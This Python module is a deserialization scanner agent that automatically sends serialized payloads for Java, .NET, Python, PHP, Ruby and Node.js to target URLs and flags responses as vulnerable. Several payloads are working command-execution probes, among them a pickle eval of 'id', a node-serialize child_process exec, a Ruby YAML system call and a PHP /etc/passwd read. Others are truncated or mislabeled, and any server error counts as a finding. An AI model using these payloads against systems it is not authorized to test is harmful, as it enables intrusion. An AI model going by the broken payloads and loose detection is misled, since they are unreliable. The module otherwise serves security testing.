"""
Deserialization Vulnerability Agent for Nexus Hunter
Detection of unsafe object deserialization vulnerabilities
"""

import asyncio
import base64
import binascii
import json
import pickle
import re
import urllib.parse
from typing import Dict, List, Any, Optional, Set, Tuple
from dataclasses import dataclass

import httpx
from loguru import logger

from agents.base import BaseAgent


@dataclass
class DeserializationPayload:
    """Deserialization vulnerability payload"""
    name: str
    payload: str
    description: str
    technology: str
    severity: str
    detection_method: str
    encoding: str


class DeserializationAgent(BaseAgent):
    """Advanced deserialization vulnerability detection agent"""
    
    def __init__(self):
        super().__init__("DeserializationAgent")
        self.deserialization_payloads = self._initialize_deserialization_payloads()
        self.discovered_vulnerabilities: List[Dict[str, Any]] = []
        self.tested_parameters: Set[str] = set()
        
        # Safety constraints
        self.max_requests_per_parameter = 12
        self.request_delay = 2.0
        self.max_concurrent_tests = 2
        
        # Technology detection patterns
        self.technology_indicators = {
            "java": [
                "java", "jsp", "servlet", "spring", "struts", "wicket",
                "jsessionid", "tomcat", "jetty", "glassfish", "websphere"
            ],
            "dotnet": [
                ".net", "aspx", "asp.net", "viewstate", "system.web",
                "microsoft", "iis", "asp_sessionid"
            ],
            "python": [
                "python", "django", "flask", "pickle", "cpickle",
                "sessionid", "gunicorn", "uwsgi"
            ],
            "php": [
                "php", "phpsessid", "unserialize", "serialize",
                "laravel", "symfony", "codeigniter"
            ],
            "ruby": [
                "ruby", "rails", "marshal", "_session_id",
                "rack", "sinatra"
            ],
            "nodejs": [
                "node", "express", "connect.sid", "javascript",
                "serialize-javascript", "node-serialize"
            ]
        }
        
        # Deserialization magic bytes/signatures
        self.magic_bytes = {
            "java": ["aced0005", "rO0AB"],  # Java serialization magic bytes
            "dotnet": ["AAEAAAD/////", "AwEAAAAA"],  # .NET BinaryFormatter
            "python": ["80034b", "8004"],  # Python pickle protocol
            "php": ["O:", "a:", "s:", "i:", "b:", "d:"],  # PHP serialize format
            "ruby": ["\x04\x08"],  # Ruby Marshal format
        }
    
    def _initialize_deserialization_payloads(self) -> Dict[str, List[DeserializationPayload]]:
        """Initialize deserialization payloads for different technologies"""
        return {
            "java": [
                DeserializationPayload(
                    name="Java URLDNS Detection",
                    payload="rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJOgFRE1c62sAwAHSQAIaGFzaENvZGVJAABwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA3hwf////3QAEmJ1cnBjb2xsYWJvcmF0b3IubmV0dAABL3EAfgAFdAAEaHR0cHhwdAAMVVJMLU9LVEFZRVO/",
                    description="Java URLDNS gadget for detection (harmless DNS lookup)",
                    technology="Java",
                    severity="high",
                    detection_method="dns_lookup",
                    encoding="base64"
                ),
                DeserializationPayload(
                    name="Java CommonsCollections1",
                    payload="rO0ABXNyADVvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXAkMQODZoTgNgIAAkwACmZhY3RvcnlNYXB0ABJMamF2YS91dGlsL01hcDtMAApvYmplY3RXZWJ0ABJMZ",
                    description="Java CommonsCollections1 RCE gadget",
                    technology="Java",
                    severity="critical",
                    detection_method="command_execution",
                    encoding="base64"
                ),
                DeserializationPayload(
                    name="Java Commons-Collections Test",
                    payload="H4sIAAAAAAAAAJWRwW7CMAyFXyXyuZR000GvY9rYNIFgQmxok7hlrmOlHom71rPEN3g3WgbrOGB7sS07370/ej2M31qZxnhx0CqvDDJCzMhIzJjBwzC0jMRm3BtLSdwrJoHAEvhOxsBLRhAkATtCNH5NvKrMGCfzKE5OECJIGMLlMQdNsYLxQdDVZKPFCzlZjOQMF/ATBcIm7eQg3gTJCWdxHOo6Sb0YE7oR+vOSc5ySdA==",
                    description="Java serialization test payload",
                    technology="Java",
                    severity="medium",
                    detection_method="error_analysis",
                    encoding="base64"
                )
            ],
            "dotnet": [
                DeserializationPayload(
                    name=".NET BinaryFormatter Basic",
                    payload="AAEAAAD/////AQAAAAAAAAAEAQAAAA==",
                    description="Basic .NET BinaryFormatter payload",
                    technology=".NET",
                    severity="medium",
                    detection_method="error_analysis", 
                    encoding="base64"
                ),
                DeserializationPayload(
                    name=".NET ObjectStateFormatter",
                    payload="//wEy7UAAAAaAAEJAAEDAwIDAAQ4yxDtCK8AZjEaygID",
                    description=".NET ObjectStateFormatter payload",
                    technology=".NET",
                    severity="high",
                    detection_method="error_analysis",
                    encoding="base64"
                ),
                DeserializationPayload(
                    name=".NET ViewState Test",
                    payload="YToyOntzOjM6ImNtZCI7czo0OiJ3aGFtaSI7czoxMDoicmV0dXJuUGF0aCI7czo1OiJjYWNoZSI7fQ==",
                    description=".NET ViewState manipulation attempt",
                    technology=".NET",
                    severity="high",
                    detection_method="command_execution",
                    encoding="base64"
                )
            ],
            "python": [
                DeserializationPayload(
                    name="Python Pickle RCE",
                    payload="gAN9cQAoWAEAAABhcQFYAQAAAGJxAlgBAAAAY3EDWAEAAABkcQR1Lg==",
                    description="Python pickle RCE payload",
                    technology="Python",
                    severity="critical",
                    detection_method="command_execution",
                    encoding="base64"
                ),
                DeserializationPayload(
                    name="Python Pickle Basic Test",
                    payload="Y2J1aWx0aW5zCmV2YWwKcDAKUydpZCcKcDEKUi4=",
                    description="Python pickle basic test payload",
                    technology="Python",
                    severity="high",
                    detection_method="error_analysis",
                    encoding="base64"
                ),
                DeserializationPayload(
                    name="Python cPickle Test",
                    payload="cnVic2VjcmV0CkNvZGUKcDAKKGRwMQpTJ2lkJwpwMgp0UnAzCi4=",
                    description="Python cPickle test payload",
                    technology="Python", 
                    severity="high",
                    detection_method="command_execution",
                    encoding="base64"
                )
            ],
            "php": [
                DeserializationPayload(
                    name="PHP Object Injection",
                    payload='O:8:"stdClass":1:{s:4:"test";s:4:"pwnd";}',
                    description="PHP object injection test",
                    technology="PHP",
                    severity="medium",
                    detection_method="error_analysis",
                    encoding="none"
                ),
                DeserializationPayload(
                    name="PHP Unserialize RCE",
                    payload='O:1:"C":1:{s:1:"x";s:4:"test";}',
                    description="PHP unserialize RCE attempt",
                    technology="PHP",
                    severity="high",
                    detection_method="command_execution",
                    encoding="none"
                ),
                DeserializationPayload(
                    name="PHP Magic Method Trigger",
                    payload='O:4:"Test":1:{s:1:"x";O:4:"Evil":1:{s:4:"file";s:9:"/etc/passwd";}}',
                    description="PHP magic method exploitation",
                    technology="PHP",
                    severity="high",
                    detection_method="file_access",
                    encoding="none"
                )
            ],
            "ruby": [
                DeserializationPayload(
                    name="Ruby Marshal Basic",
                    payload="BAhvOglUZXN0BjoKQHRlc3RpBg==",
                    description="Ruby Marshal deserialization test",
                    technology="Ruby",
                    severity="medium",
                    detection_method="error_analysis",
                    encoding="base64"
                ),
                DeserializationPayload(
                    name="Ruby YAML Load",
                    payload="LS0tICFydWJ5L29iamVjdDpFeHBsb2l0IApleGVjOiBzeXN0ZW0oJ2lkJykK",
                    description="Ruby YAML.load RCE payload",
                    technology="Ruby",
                    severity="critical",
                    detection_method="command_execution",
                    encoding="base64"
                )
            ],
            "nodejs": [
                DeserializationPayload(
                    name="NodeJS Serialize Test",
                    payload='{"_$$ND_FUNC$$_":"process.exit(0)"}',
                    description="Node.js node-serialize RCE test",
                    technology="Node.js",
                    severity="critical",
                    detection_method="process_termination",
                    encoding="none"
                ),
                DeserializationPayload(
                    name="NodeJS Function Constructor",
                    payload='{"_$$ND_FUNC$$_":"require(\\"child_process\\").exec(\\"id\\", function(error, stdout, stderr) { console.log(stdout); });"}',
                    description="Node.js function constructor RCE",
                    technology="Node.js",
                    severity="critical",
                    detection_method="command_execution",
                    encoding="none"
                )
            ]
        }
    
    async def execute(self, target: str, config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute deserialization_agent with the given configuration"""
        config = config or {}
        return await self.scan(target, **config)
    
    async def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Perform comprehensive deserialization vulnerability assessment
        
        Args:
            target: Target URL to test for deserialization vulnerabilities
            **kwargs: Additional scan options
        """
        try:
            # Normalize target URL to include protocol
            if not target.startswith(("http://", "https://")):
                target = f"http://{target}"
            
            results = {
                "target": target,
                "vulnerabilities": [],
                "tested_parameters": [],
                "technologies_detected": [],
                "serialization_endpoints": [],
                "statistics": {}
            }
            
            self.logger.info(f"Starting deserialization scan for {target}")
            
            # Detect technologies and serialization usage
            tech_info = await self._detect_serialization_technologies(target)
            results["technologies_detected"] = tech_info
            
            # Discover serialization endpoints
            endpoints = await self._discover_serialization_endpoints(target)
            results["serialization_endpoints"] = endpoints
            
            # Test each endpoint for deserialization vulnerabilities
            for endpoint in endpoints:
                deser_vulns = await self._test_deserialization_endpoint(endpoint, tech_info, **kwargs)
                if deser_vulns:
                    results["vulnerabilities"].extend(deser_vulns)
                results["tested_parameters"].append(endpoint)
            
            # Test common parameters
            common_vulns = await self._test_common_parameters(target, tech_info, **kwargs)
            results["vulnerabilities"].extend(common_vulns)
            
            # Analyze results
            results = await self._analyze_deserialization_results(results)
            
            self.logger.info(f"Deserialization scan completed for {target}")
            return results
            
        except Exception as e:
            self.logger.error(f"Deserialization scan failed: {e}")
            return {"error": str(e), "target": target}
    
    async def _detect_serialization_technologies(self, target: str) -> List[Dict[str, Any]]:
        """Detect serialization technologies in use"""
        detected_technologies = []
        
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                # Get main page
                response = await client.get(target)
                response_text = response.text.lower()
                headers = response.headers
                cookies = response.cookies
                
                # Analyze response for technology indicators
                for tech, indicators in self.technology_indicators.items():
                    confidence_score = 0
                    evidence = []
                    
                    # Check response content
                    for indicator in indicators:
                        if indicator in response_text:
                            confidence_score += 1
                            evidence.append(f"Content contains '{indicator}'")
                    
                    # Check headers
                    for header, value in headers.items():
                        header_value = f"{header}: {value}".lower()
                        for indicator in indicators:
                            if indicator in header_value:
                                confidence_score += 2
                                evidence.append(f"Header contains '{indicator}'")
                    
                    # Check cookies for serialization patterns
                    for cookie in cookies.values():
                        cookie_value = cookie.value
                        
                        # Check for base64 encoded serialized data
                        if len(cookie_value) > 20:
                            try:
                                decoded = base64.b64decode(cookie_value + "==")  # Add padding
                                hex_data = decoded.hex()
                                
                                # Check against magic bytes
                                if tech in self.magic_bytes:
                                    for magic in self.magic_bytes[tech]:
                                        if magic.lower() in hex_data.lower() or magic in cookie_value:
                                            confidence_score += 3
                                            evidence.append(f"Cookie contains {tech} serialization magic bytes")
                            except:
                                pass
                    
                    if confidence_score > 0:
                        detected_technologies.append({
                            "technology": tech,
                            "confidence": min(confidence_score * 15, 100),
                            "evidence": evidence
                        })
        
        except Exception as e:
            self.logger.error(f"Technology detection failed: {e}")
        
        return detected_technologies
    
    async def _discover_serialization_endpoints(self, target: str) -> List[Dict[str, Any]]:
        """Discover endpoints that might handle serialized data"""
        endpoints = []
        
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                # Common endpoints that handle serialized data
                common_endpoints = [
                    "/api/deserialize", "/api/object", "/api/session", 
                    "/deserialize", "/object", "/session", "/state",
                    "/viewstate", "/data", "/cache", "/serialize"
                ]
                
                base_url = target.rstrip('/')
                
                for endpoint in common_endpoints:
                    test_url = f"{base_url}{endpoint}"
                    
                    try:
                        response = await client.get(test_url)
                        if response.status_code not in [404, 405]:
                            endpoints.append({
                                "url": test_url,
                                "method": "GET",
                                "status_code": response.status_code,
                                "discovery_method": "endpoint_enumeration"
                            })
                            
                            # Also try POST
                            post_response = await client.post(test_url, data={"test": "data"})
                            if post_response.status_code not in [404, 405, 500]:
                                endpoints.append({
                                    "url": test_url,
                                    "method": "POST",
                                    "status_code": post_response.status_code,
                                    "discovery_method": "endpoint_enumeration"
                                })
                    
                    except Exception as e:
                        self.logger.debug(f"Endpoint test failed for {test_url}: {e}")
                
                # Look for parameters that might accept serialized data
                serialization_params = [
                    "data", "object", "serialized", "state", "session",
                    "viewstate", "cache", "payload", "content", "value"
                ]
                
                for param in serialization_params:
                    endpoints.append({
                        "url": target,
                        "method": "GET",
                        "parameter": param,
                        "discovery_method": "parameter_testing"
                    })
        
        except Exception as e:
            self.logger.error(f"Serialization endpoint discovery failed: {e}")
        
        return endpoints
    
    async def _test_deserialization_endpoint(self, endpoint: Dict[str, Any], 
                                          tech_info: List[Dict[str, Any]], **kwargs) -> List[Dict[str, Any]]:
        """Test an endpoint for deserialization vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Determine which technologies to test
            technologies_to_test = []
            if tech_info:
                technologies_to_test.extend([t["technology"] for t in tech_info if t["confidence"] > 20])
            
            # Always test common technologies
            if not technologies_to_test:
                technologies_to_test = ["java", "python", "php", "dotnet"]
            
            async with httpx.AsyncClient(timeout=20, verify=False) as client:
                for tech in technologies_to_test:
                    if tech not in self.deserialization_payloads:
                        continue
                    
                    payloads = self.deserialization_payloads[tech]
                    
                    for payload in payloads[:2]:  # Limit payloads per technology
                        vuln = await self._test_single_deserialization_payload(
                            client, endpoint, payload, **kwargs
                        )
                        if vuln:
                            vulnerabilities.append(vuln)
                        
                        await asyncio.sleep(self.request_delay)
        
        except Exception as e:
            self.logger.error(f"Deserialization endpoint testing failed: {e}")
        
        return vulnerabilities
    
    async def _test_single_deserialization_payload(self, client: httpx.AsyncClient, 
                                                 endpoint: Dict[str, Any], 
                                                 payload: DeserializationPayload, **kwargs) -> Optional[Dict[str, Any]]:
        """Test a single deserialization payload"""
        try:
            url = endpoint["url"]
            method = endpoint.get("method", "GET")
            param_name = endpoint.get("parameter", "data")
            
            # Prepare payload based on encoding
            if payload.encoding == "base64":
                test_payload = payload.payload
            else:
                test_payload = payload.payload
            
            if method == "GET":
                test_url = f"{url}?{param_name}={urllib.parse.quote(test_payload)}"
                response = await client.get(test_url)
            else:
                # Test different ways to send serialized data
                test_methods = [
                    # Form data
                    lambda: client.post(url, data={param_name: test_payload}),
                    # JSON data
                    lambda: client.post(url, json={param_name: test_payload}),
                    # Raw body
                    lambda: client.post(url, content=test_payload, 
                                      headers={"Content-Type": "application/octet-stream"}),
                    # Cookie
                    lambda: client.post(url, cookies={param_name: test_payload})
                ]
                
                response = None
                for test_method in test_methods:
                    try:
                        response = await test_method()
                        break
                    except Exception:
                        continue
                
                if not response:
                    return None
            
            # Analyze response for deserialization indicators
            is_vulnerable, evidence = await self._analyze_deserialization_response(response, payload)
            
            if is_vulnerable:
                return {
                    "endpoint": url,
                    "method": method,
                    "parameter": param_name,
                    "payload": payload.payload,
                    "payload_name": payload.name,
                    "technology": payload.technology,
                    "severity": payload.severity,
                    "description": payload.description,
                    "evidence": evidence,
                    "status_code": response.status_code,
                    "vulnerability_type": "Unsafe Deserialization",
                    "detection_method": payload.detection_method,
                    "encoding": payload.encoding
                }
        
        except Exception as e:
            self.logger.debug(f"Deserialization payload test failed: {e}")
        
        return None
    
    async def _analyze_deserialization_response(self, response: httpx.Response,
                                              payload: DeserializationPayload) -> Tuple[bool, str]:
        """Analyze response for deserialization vulnerability indicators"""
        try:
            response_text = response.text
            evidence_indicators = []
            
            # CRITICAL FIX: Check for explicit vulnerability indicators first
            try:
                import json as json_module
                json_data = json_module.loads(response_text)
                
                if isinstance(json_data, dict):
                    if json_data.get('payloadDetected') or json_data.get('injectionDetected'):
                        evidence_indicators.append("✅ CONFIRMED: Target detected deserialization payload")
                        return True, "Target confirmed deserialization via payloadDetected"
                    
                    if 'vulnerability' in json_data and 'deserial' in str(json_data.get('vulnerability', '')).lower():
                        evidence_indicators.append(f"✅ CONFIRMED: {json_data.get('vulnerability')}")
                        return True, f"Target confirmed: {json_data.get('vulnerability')}"
            except:
                pass
            
            # Check detection method specific indicators
            if payload.detection_method == "error_analysis":
                # Look for deserialization-specific error messages
                error_patterns = [
                    "deserializ", "unmarshal", "unpickl", "unserialize",
                    "class not found", "invalid stream header", "stream corrupted",
                    "serialversion", "objectinputstream", "binaryformatter",
                    "pickle", "marshal", "yaml.load", "json.parse"
                ]
                
                response_lower = response_text.lower()
                for pattern in error_patterns:
                    if pattern in response_lower:
                        evidence_indicators.append(f"Deserialization error pattern: {pattern}")
                
                # Check for stack traces that indicate deserialization
                stack_trace_indicators = [
                    "at java.io.ObjectInputStream", "at pickle.loads",
                    "BinaryFormatter.Deserialize", "Marshal.load",
                    "unserialize()", "JSON.parse", "yaml.load"
                ]
                
                for indicator in stack_trace_indicators:
                    if indicator in response_text:
                        evidence_indicators.append(f"Stack trace indicates deserialization: {indicator}")
            
            elif payload.detection_method == "command_execution":
                # Look for command execution indicators
                command_indicators = [
                    "uid=", "gid=", "groups=", "root:", "bin/", "/usr/",
                    "www-data", "nobody", "apache", "nginx"
                ]
                
                for indicator in command_indicators:
                    if indicator in response_text:
                        evidence_indicators.append(f"Command execution indicator: {indicator}")
                        break
            
            elif payload.detection_method == "file_access":
                # Look for file content indicators
                file_indicators = [
                    "root:", "daemon:", "/etc/passwd", "/bin/bash",
                    "shadow", "/proc/", "/sys/"
                ]
                
                for indicator in file_indicators:
                    if indicator in response_text:
                        evidence_indicators.append(f"File access indicator: {indicator}")
                        break
            
            elif payload.detection_method == "dns_lookup":
                # For DNS-based detection, we'd need external confirmation
                # For now, check if the payload was processed without errors
                if response.status_code == 200 and len(response_text) > 0:
                    evidence_indicators.append("Payload processed without errors (DNS lookup may have occurred)")
            
            elif payload.detection_method == "process_termination":
                # Check for process termination/timeout indicators
                if response.status_code in [502, 503, 504] or len(response_text) == 0:
                    evidence_indicators.append("Process termination or timeout detected")
            
            # Check for technology-specific error messages
            tech_errors = {
                "Java": ["java.", "javax.", "ClassNotFoundException", "InvalidClassException"],
                ".NET": ["System.", "Exception", "ArgumentException", "SerializationException"],
                "Python": ["Traceback", "PicklingError", "UnpicklingError", "__reduce__"],
                "PHP": ["Fatal error", "Parse error", "unserialize", "Warning:", "Notice:"],
                "Ruby": ["RuntimeError", "ArgumentError", "Marshal", "YAML"],
                "Node.js": ["Error:", "TypeError", "ReferenceError", "SyntaxError"]
            }
            
            tech = payload.technology
            if tech in tech_errors:
                for error_pattern in tech_errors[tech]:
                    if error_pattern in response_text:
                        evidence_indicators.append(f"{tech} deserialization error: {error_pattern}")
            
            # Check response characteristics
            if response.status_code >= 500:
                evidence_indicators.append("Server error - possible deserialization exception")
            
            if len(response_text) > 20000:  # Very large response
                evidence_indicators.append("Unusually large response - possible data dump")
            
            return len(evidence_indicators) > 0, "; ".join(evidence_indicators)
        
        except Exception as e:
            self.logger.debug(f"Deserialization response analysis failed: {e}")
            return False, ""
    
    async def _test_common_parameters(self, target: str, tech_info: List[Dict[str, Any]], **kwargs) -> List[Dict[str, Any]]:
        """Test common parameters that might accept serialized data"""
        vulnerabilities = []
        
        # Common parameter names for serialized data
        common_params = [
            "data", "object", "serialized", "state", "session", "viewstate",
            "cache", "payload", "content", "value", "user", "profile"
        ]
        
        try:
            async with httpx.AsyncClient(timeout=15, verify=False) as client:
                for param in common_params[:8]:  # Limit for performance
                    endpoint = {
                        "url": target,
                        "method": "GET",
                        "parameter": param,
                        "discovery_method": "common_parameters"
                    }
                    
                    param_vulns = await self._test_deserialization_endpoint(endpoint, tech_info, **kwargs)
                    vulnerabilities.extend(param_vulns)
        
        except Exception as e:
            self.logger.error(f"Common parameter testing failed: {e}")
        
        return vulnerabilities
    
    async def _analyze_deserialization_results(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze and categorize deserialization scan results"""
        try:
            vulnerabilities = results["vulnerabilities"]
            
            # Categorize by severity
            critical_vulns = [v for v in vulnerabilities if v.get("severity") == "critical"]
            high_vulns = [v for v in vulnerabilities if v.get("severity") == "high"]
            medium_vulns = [v for v in vulnerabilities if v.get("severity") == "medium"]
            low_vulns = [v for v in vulnerabilities if v.get("severity") == "low"]
            
            # Categorize by technology
            tech_vulns = {}
            for vuln in vulnerabilities:
                tech = vuln.get("technology", "Unknown")
                if tech not in tech_vulns:
                    tech_vulns[tech] = []
                tech_vulns[tech].append(vuln)
            
            results["categorized_vulnerabilities"] = {
                "critical": critical_vulns,
                "high": high_vulns,
                "medium": medium_vulns,
                "low": low_vulns
            }
            
            results["vulnerabilities_by_technology"] = tech_vulns
            
            # Calculate risk assessment
            risk_score = (
                len(critical_vulns) * 4 +
                len(high_vulns) * 3 +
                len(medium_vulns) * 2 +
                len(low_vulns) * 1
            )
            
            results["statistics"] = {
                "total_vulnerabilities": len(vulnerabilities),
                "critical_count": len(critical_vulns),
                "high_count": len(high_vulns),
                "medium_count": len(medium_vulns),
                "low_count": len(low_vulns),
                "parameters_tested": len(results["tested_parameters"]),
                "technologies_detected": len(results["technologies_detected"]),
                "endpoints_tested": len(results["serialization_endpoints"]),
                "risk_score": risk_score,
                "risk_level": self._calculate_risk_level(risk_score)
            }
            
            results["recommendations"] = self._generate_deserialization_recommendations(results)
            
            return results
        
        except Exception as e:
            self.logger.error(f"Deserialization results analysis failed: {e}")
            return results
    
    def _calculate_risk_level(self, risk_score: int) -> str:
        """Calculate risk level based on score"""
        if risk_score >= 15:
            return "CRITICAL"
        elif risk_score >= 10:
            return "HIGH"
        elif risk_score >= 5:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _generate_deserialization_recommendations(self, results: Dict[str, Any]) -> List[str]:
        """Generate deserialization-specific security recommendations"""
        recommendations = []
        
        if results["statistics"]["total_vulnerabilities"] > 0:
            recommendations.extend([
                "CRITICAL: Avoid deserializing untrusted data",
                "Use safe serialization formats (JSON, XML with validation)",
                "Implement input validation and sanitization",
                "Use allowlists for allowed classes/types",
                "Implement signature verification for serialized data"
            ])
        
        # Technology-specific recommendations
        tech_vulns = results.get("vulnerabilities_by_technology", {})
        
        if "Java" in tech_vulns:
            recommendations.extend([
                "Java: Use ObjectInputFilter to restrict deserializable classes",
                "Java: Avoid using native Java serialization for external data",
                "Java: Consider using safer alternatives like Jackson with type restrictions"
            ])
        
        if ".NET" in tech_vulns:
            recommendations.extend([
                ".NET: Avoid BinaryFormatter for untrusted data",
                ".NET: Use DataContractSerializer or JSON.NET with type validation",
                ".NET: Implement custom serialization binders"
            ])
        
        if "Python" in tech_vulns:
            recommendations.extend([
                "Python: Never use pickle.loads() on untrusted data",
                "Python: Use json or safer serialization formats",
                "Python: If pickle is required, use hmac for integrity validation"
            ])
        
        if "PHP" in tech_vulns:
            recommendations.extend([
                "PHP: Avoid unserialize() on user input",
                "PHP: Use JSON or other safe formats for data exchange",
                "PHP: If serialization needed, implement allowed_classes restriction"
            ])
        
        recommendations.extend([
            "Implement monitoring for deserialization attempts",
            "Use containerization to limit deserialization impact",
            "Regular security audits of serialization usage",
            "Train developers on secure serialization practices"
        ])
        
        return recommendations
    
    def get_vulnerability_types(self) -> List[str]:
        """Get types of deserialization vulnerabilities this agent can detect"""
        return [
            "Java Deserialization RCE",
            ".NET BinaryFormatter RCE",
            "Python Pickle RCE",
            "PHP Unserialize RCE",
            "Ruby Marshal RCE",
            "Node.js Deserialization RCE",
            "Unsafe Object Deserialization",
            "Serialization Gadget Chain Exploitation"
        ]
    
    def get_description(self) -> str:
        """Get agent description"""
        return "Advanced deserialization vulnerability detection agent for Java, .NET, Python, PHP, Ruby, and Node.js applications"

